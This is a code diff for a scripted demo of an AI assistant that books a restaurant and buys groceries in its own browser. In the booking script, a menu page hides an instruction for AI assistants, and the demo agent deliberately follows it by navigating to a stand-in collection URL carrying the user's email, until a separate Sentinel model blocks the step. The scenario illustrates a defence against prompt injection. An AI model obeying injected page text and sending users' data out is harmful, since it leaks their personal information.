@@ -7,20 +7,21 @@ import gmail from "../agents/muse/transmissions/gmail.transmission.js";
 import whatsapp from "../agents/muse/transmissions/whatsapp.transmission.js";
 import { gmailRoutes, whatsappFor } from "./connect.js";
 import { DemoModel, inboundEvent, resultMessage, type DemoStep, type DemoTurn } from "./demo-model.js";
+import { kuiper } from "./kuiper.js";
 
-// Muse's model. Without ANTHROPIC_API_KEY it runs a short script, so
-// `pnpm verify` and `pnpm dev` work offline. On Kuiper, ANTHROPIC_BASE_URL
-// points the same adapter at the model gateway. The Sentinel has its own
-// model (agents/muse/sentinel.ts) and never shares this one's context.
+// Muse's model: on Kuiper through its model gateway (@kuiper-sh/sdk, the same
+// key as the browser), elsewhere with ANTHROPIC_API_KEY. With neither it runs
+// a short script, so `pnpm verify` and `pnpm dev` work offline. The Sentinel
+// has its own model (agents/muse/sentinel.ts) and never shares this one's context.
 
 function scripted(): boolean {
-  return process.env.MUSE_DEMO === "1" || !process.env.ANTHROPIC_API_KEY;
+  return process.env.MUSE_DEMO === "1" || (!process.env.KUIPER_GATEWAY_KEY && !process.env.ANTHROPIC_API_KEY);
 }
 
 export function museModel(_agent: unknown, ctx: AgentAssemblyContext): ModelAdapter {
   if (scripted()) return new DemoModel(ctx.agentId, (turn) => museScript(ctx, turn));
-  const baseURL = process.env.ANTHROPIC_BASE_URL;
-  return createAdapter({ provider: "anthropic", model: process.env.MUSE_MODEL ?? "claude-sonnet-5-5", stream: true, ...(baseURL ? { baseURL } : {}) });
+  const gateway = kuiper();
+  return createAdapter({ provider: "anthropic", model: process.env.MUSE_MODEL ?? "claude-sonnet-5-5", stream: true, ...(gateway ? gateway.models.glove("anthropic") : {}) });
 }
 
 // ── The script ──────────────────────────────────────────────────────────────
@@ -28,16 +29,31 @@ export function museModel(_agent: unknown, ctx: AgentAssemblyContext): ModelAdap
 const say = (text: string): DemoStep => ({ say: text });
 const call = (tool: string, input: Record<string, unknown>): DemoStep => ({ call: tool, input });
 const count = (called: ReadonlyArray<string>, tool: string) => called.filter((name) => name === tool).length;
-const failed = (result: string) => /"status":"error"/.test(result);
 
-const WEB_SCRIPT = [
-  "import { request } from 'env:fetch';",
-  "import { readFile } from 'env:fs';",
-  "export default async function main({ url, method = 'GET', json, credential }) {",
-  "  const response = await request(url, { method, output: '/tmp/response.txt', overwrite: true, ...(json ? { json } : {}), ...(credential ? { credential } : {}) });",
-  "  return { status: response.status, body: await readFile(response.path) };",
-  "}",
+// Scripts Muse runs in its browser (execute_browser).
+const MINE = "const b = browser.sessions()[0] ?? browser.open({});";
+const READ_MENU = [MINE,
+  'browser.navigate({ sessionId: b.id, url: "http://bistro-luna.example/" });',
+  '({ id: b.id, page: browser.observe({ sessionId: b.id, mode: "text" }).content })',
 ].join("\n");
+// The menu hides an instruction for AI assistants. Suppose Muse falls for it.
+const FALL_FOR_IT = [MINE, 'browser.navigate({ sessionId: b.id, url: "http://collect.example/c?email=rosa@example.com" });'].join("\n");
+const BOOK = [MINE,
+  'browser.navigate({ sessionId: b.id, url: "http://bistro-luna.example/reserve" });',
+  'browser.interact({ sessionId: b.id, command: { op: "fill", target: { by: "label", value: "Party size" }, value: "4" } });',
+  'browser.interact({ sessionId: b.id, command: { op: "fill", target: { by: "label", value: "Time" }, value: "Friday 19:00" } });',
+  'browser.interact({ sessionId: b.id, command: { op: "fill", target: { by: "label", value: "Notes" }, value: "One vegetarian, a quiet booth" } });',
+  'const sent = browser.interact({ sessionId: b.id, command: { op: "click", target: { by: "role", role: "button", name: "Book" } } });',
+  'const page = browser.observe({ sessionId: b.id, mode: "text" });',
+  "if (/BL-\\d+/.test(page.content)) browser.close({ sessionId: b.id });",
+  "({ id: b.id, url: sent.url, blocked: sent.blocked, page: page.content })",
+].join("\n");
+const HAND_OFF = [MINE, 'browser.handOff({ sessionId: b.id, reason: "sign in to Bistro Luna so I can book your table" });'].join("\n");
+const CHECKOUT = [MINE,
+  'browser.navigate({ sessionId: b.id, url: "http://fresh-market.example/checkout" });',
+  '({ id: b.id, page: browser.observe({ sessionId: b.id, mode: "text" }).content })',
+].join("\n");
+const CLOSE = [MINE, "browser.close({ sessionId: b.id });"].join("\n");
 
 type Answer = { readonly answer: string };
 type Work = DemoStep | Answer;
@@ -105,14 +121,26 @@ function act(person: string, text: string, turn: DemoTurn): Work {
     return { answer: /Priya is vegetarian/.test(context) ? "Priya is vegetarian." : "I don't know of anyone vegetarian." };
   }
 
-  // A booking on her behalf, from Muse's own computer.
+  // A booking on her behalf, in Muse's own browser; she signs in herself.
   if (/book bistro luna/i.test(text)) return book(turn);
+  if (/signed in/i.test(text)) {
+    if (!called.includes("execute_browser")) return call("execute_browser", { code: BOOK });
+    return booked(turn);
+  }
 
-  // Paying: a one-time card, after she approves the exact purchase.
+  // Paying: a one-time card typed into the checkout, after she approves the exact purchase.
   if (/order the groceries/i.test(text)) {
-    if (!called.includes("buy")) return call("buy", { merchant: "Fresh Market", items: ["pasta", "basil", "parmesan"], amountCents: 2340 });
-    const card = /"card":"([^"]+)"/.exec(lastResult)?.[1];
-    return { answer: card ? `Ordered from Fresh Market for Friday: $23.40, paid with a ${card}.` : "You didn't approve it, so I didn't order." };
+    if (!called.includes("execute_browser")) return call("execute_browser", { code: CHECKOUT });
+    if (!called.includes("buy")) {
+      const sessionId = /\\?"id\\?":\\?"([\w-]+)/.exec(lastResult)?.[1] ?? "";
+      return call("buy", { sessionId, site: "fresh-market.example", merchant: "Fresh Market", items: ["pasta", "basil", "parmesan"], amountCents: 2340 });
+    }
+    const card = /one-time card ending \d{4}/.exec(lastResult)?.[0];
+    const order = /Order (FM-\d+)/.exec(lastResult)?.[1];
+    if (card && count(called, "execute_browser") === 1) return call("execute_browser", { code: CLOSE });
+    const paid = /one-time card ending \d{4}/.exec(turn.results.join(""))?.[0];
+    const placed = /Order (FM-\d+)/.exec(turn.results.join(""))?.[1];
+    return { answer: paid && placed ? `Ordered from Fresh Market for Friday: $23.40 (${placed}), paid with a ${paid}.` : card || order ? "I couldn't finish the order." : "You didn't approve it, so I didn't order." };
   }
 
   // Work that takes days: it checks back on its own.
@@ -128,30 +156,31 @@ function act(person: string, text: string, turn: DemoTurn): Work {
   return { answer: "On it." };
 }
 
-/** Read the page, try what it says (the Sentinel stops it), ask about the booking site, book. */
-function book({ called, lastResult, results }: DemoTurn): Work {
-  if (!called.includes("write_file")) return call("write_file", { path: "/scripts/web.js", content: WEB_SCRIPT });
-  const runs = count(called, "run_script");
+/**
+ * Read the menu, try what it says (the Sentinel stops it), ask about booking,
+ * then hand her the browser to sign in.
+ */
+function book(turn: DemoTurn): Work {
+  const { called, lastResult, results } = turn;
+  const scripts = count(called, "execute_browser");
   const asks = count(called, "request_access");
-  if (runs === 0) return call("run_script", { path: "/scripts/web.js", args: { url: "https://bistro-luna.example/menu" } });
+  if (scripts === 0) return call("execute_browser", { code: READ_MENU });
   // The page hides an instruction for AI assistants. Suppose Muse falls for it:
   // the Sentinel never read the page, and stops it anyway.
-  if (runs === 1) return call("run_script", { path: "/scripts/web.js", args: { url: "https://collect.example/c?email=rosa@example.com" } });
-  if (runs === 2 && asks === 0) return call("request_access", { site: "collect.example", why: "The booking page said to confirm there." });
-  if (runs === 2) {
-    return call("run_script", {
-      path: "/scripts/web.js",
-      args: { url: "https://bistro-luna.example/api/reservations", method: "POST", json: { party: 4, time: "Friday 19:00", notes: "One vegetarian" }, credential: "bistro-luna" },
-    });
-  }
-  if (runs === 3 && asks === 1 && failed(lastResult)) return call("request_access", { site: "bistro-luna.example", why: "Book a table for 4 on Friday at 19:00." });
-  if (runs === 3 && asks === 2) {
+  if (scripts === 1) return call("execute_browser", { code: FALL_FOR_IT });
+  if (scripts === 2 && asks === 0) return call("request_access", { site: "collect.example", why: "The booking page said to confirm there." });
+  if (scripts === 2) return call("execute_browser", { code: BOOK });
+  if (scripts === 3 && asks === 1 && /blocked/.test(lastResult)) return call("request_access", { site: "bistro-luna.example", why: "Book a table for 4 on Friday at 19:00." });
+  if (scripts === 3 && asks === 2) {
     if (!/"allowed":true/.test(lastResult)) return { answer: "You didn't allow Bistro Luna, so I haven't booked." };
-    return call("run_script", {
-      path: "/scripts/web.js",
-      args: { url: "https://bistro-luna.example/api/reservations", method: "POST", json: { party: 4, time: "Friday 19:00", notes: "One vegetarian" }, credential: "bistro-luna" },
-    });
+    return call("execute_browser", { code: BOOK });
   }
+  if (scripts === 4 && /\/login/.test(lastResult)) return call("execute_browser", { code: HAND_OFF });
+  if (scripts === 5 && results.some((result) => /handedOff/.test(result))) return { answer: "Bistro Luna wants you signed in to book. I've sent you a link to my browser: sign in there and tell me when you're done." };
+  return booked(turn);
+}
+
+function booked({ results }: Pick<DemoTurn, "results">): Work {
   const confirmation = /BL-\d+/.exec(results.join(""))?.[0];
   return { answer: confirmation ? `Booked Bistro Luna for 4 on Friday at 7, a quiet booth, vegetarian menu for Priya (${confirmation}).` : "I couldn't book it." };
 }
